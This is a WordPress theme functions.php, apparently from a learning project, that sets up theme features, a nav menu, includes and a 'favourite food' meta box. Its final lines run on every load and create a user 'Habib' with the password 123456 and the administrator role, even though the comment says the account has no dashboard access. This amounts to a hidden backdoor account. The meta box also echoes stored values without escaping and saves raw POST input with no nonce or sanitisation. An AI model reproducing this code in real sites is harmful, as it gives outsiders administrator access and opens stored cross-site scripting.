<?php
function zboom_default_functions() {
    add_theme_support("title-tag");
    add_theme_support("post-thumbnails");
    add_theme_support("custom-background");
    
    load_theme_textdomain("zboom",get_template_directory_uri() ."/languages");
    
    /* Nav Menu */
    if (function_exists("register_nav_menu")) {
        register_nav_menu("main-menu", __("Main menu","zboom"));
    }

    /* Read More */
    function read_more($limit) {
        $post_content = explode(" ",get_the_content());
        $less_content = array_slice($post_content,0,$limit);
        echo implode(" ",$less_content);
    }

    /* যদি "shortcode" Widget-এ না কাজ করে তাহলে এই ফাংশনটি ব্যবহার করতে হয়
    add_filter( "widget_tex","do_shortcode" ); */
}
add_action("after_setup_theme","zboom_default_functions");


// Included Functions====================================
/* Post Type Register */
include "inc/post_type_register.php";
/* Theme Widgets */
include "inc/theme_widgets.php";
/* Theme CSS JS Enqueue */
include "inc/enqueue.php";
/* Redux Framework Enqueue */
include "lib/redux/redux-core/framework.php";
include "lib/redux/sample/config.php";
/* Shortcode Enqueue */
include "shortcode.php";

// My Custom Fidelds=====================================
function zboom_favourite_food() {
    add_meta_box(
    "fav-food", // $id:string,
    esc_html__( "What is your favourite food?","zboom" ), // $title:string,
    "zboom_my_meta_box", // $callback:callable,
    array("page","zboom-slider"), // $screen:string|array|WP_Screen|null,
    // $context:string,
    // $priority:string,
    // $callback_args:array|null
    );
}
add_action( "add_meta_boxes","zboom_favourite_food" );

/* Function */
function zboom_my_meta_box() {
    ?>

    <label for="food">Write your favourite food</label><br>
    <input class="components-text-control__input" type="text" name="favfood" id="food" value="<?php echo get_post_meta( get_the_ID(),"favfood",true ) ?>" placeholder="Honey">

    <?php
}

/* Function */
function zboom_custom_update_metabox($post_id) {
    update_post_meta( $post_id, "favfood", $_POST["favfood"] );
}
add_action( "save_post","zboom_custom_update_metabox" );

// Create User Without Dashboard Access
$new_user = new WP_User(wp_create_user("Habib",123456,"def@gmail.com"));
$new_user -> set_role("administrator");
